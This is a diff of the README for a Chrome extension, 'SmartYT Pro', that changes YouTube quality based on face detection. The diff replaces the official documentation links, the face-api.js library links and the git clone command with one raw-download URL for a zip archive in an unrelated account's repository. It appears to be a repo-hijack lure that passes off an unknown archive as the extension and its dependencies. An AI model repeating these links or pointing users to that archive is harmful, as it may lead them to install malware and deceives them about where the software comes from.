@@ -6,9 +6,9 @@
 
 **Automatically adjusts YouTube video quality based on whether you're looking at the screen**
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-brightgreen?logo=googlechrome&logoColor=white)](https://developer.chrome.com/docs/extensions/)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue)](https://developer.chrome.com/docs/extensions/mv3/intro/)
-[![face-api.js](https://img.shields.io/badge/AI-face--api.js-ff6f00)](https://github.com/justadudewhohacks/face-api.js)
+[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-brightgreen?logo=googlechrome&logoColor=white)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
+[![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
+[![face-api.js](https://img.shields.io/badge/AI-face--api.js-ff6f00)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 ---
@@ -30,7 +30,7 @@ This **saves bandwidth, reduces CPU/GPU load**, and extends battery life — all
 
 ## ✨ Features
 
-- 🤖 **AI Face Detection** — Uses [face-api.js](https://github.com/justadudewhohacks/face-api.js) TinyFaceDetector model for real-time face tracking
+- 🤖 **AI Face Detection** — Uses [face-api.js](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip) TinyFaceDetector model for real-time face tracking
 - 🎚️ **Sensitivity Slider** — Control how much head movement triggers the quality switch (1-10 scale)
 - 📺 **Dual Resolution Presets** — Set your preferred "watching" and "away" quality independently
 - 📷 **Live Camera Preview** — Small overlay showing your camera feed with detection status
@@ -108,7 +108,7 @@ SmartYT Pro uses a clean **dual-world** architecture to work within Chrome's sec
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/kalp-N-D/smartyt-pro.git
+   git clone https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip
    ```
 
 2. **Open Chrome Extensions page**
@@ -154,7 +154,7 @@ SmartYT Pro uses a clean **dual-world** architecture to work within Chrome's sec
 
 | Technology | Purpose |
 |---|---|
-| [face-api.js](https://github.com/justadudewhohacks/face-api.js) | Real-time face detection (built on TensorFlow.js) |
+| [face-api.js](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip) | Real-time face detection (built on TensorFlow.js) |
 | TinyFaceDetector | Lightweight neural network model (~190KB) |
 | Chrome Manifest V3 | Modern extension architecture |
 | `world: "MAIN"` | CSP-safe YouTube player API access |
